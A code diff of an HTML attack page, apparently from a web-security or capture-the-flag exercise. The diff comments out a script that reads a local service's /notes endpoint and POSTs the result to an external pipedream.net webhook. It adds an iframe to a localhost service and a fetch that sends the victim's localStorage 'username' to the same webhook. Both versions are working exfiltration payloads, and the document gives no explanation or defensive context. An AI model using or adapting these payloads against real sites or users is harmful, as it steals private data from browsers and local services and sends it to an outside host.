@@ -1,23 +1,26 @@
 <html>
   <body>
+    <iframe src="http://localhost:4000"></iframe>
     <script>
-      async function lmao() {
-        var req = new XMLHttpRequest();
-        req.open('GET', 'http://0.0.0.0:8080/notes', true);
-        req.setRequestHeader('Access-Control-Allow-Origin', '*');
-        req.setRequestHeader('Origin', '0.0.0.0:8080');
-        await req.send(null);
-        if(req.status == 200) {
-          src = req.responseText;
-        }
-        else {
-          src = req.statusText;
-        }
-        var req_webhook = new XMLHttpRequest();
-        req_webhook.open('POST', `https://en54ypp3nacrf.x.pipedream.net/`, true);
-        await req_webhook.send(src);
-      }
-      lmao()
+//       async function lmao() {
+//         var req = new XMLHttpRequest();
+//         req.open('GET', 'http://0.0.0.0:8080/notes', true);
+//         req.setRequestHeader('Access-Control-Allow-Origin', '*');
+//         req.setRequestHeader('Origin', '0.0.0.0:8080');
+//         await req.send(null);
+//         if(req.status == 200) {
+//           src = req.responseText;
+//         }
+//         else {
+//           src = req.statusText;
+//         }
+//         var req_webhook = new XMLHttpRequest();
+//         req_webhook.open('POST', `https://en54ypp3nacrf.x.pipedream.net/`, true);
+//         await req_webhook.send(src);
+//       }
+//       lmao()
+      let username = window.localStorage["username"];
+      fetch(`https://en54ypp3nacrf.x.pipedream.net?a=${username}`)
        //var link = document.createElement("button");
        //link.name = "action";
        //link.onclick = "history.go(-2)";
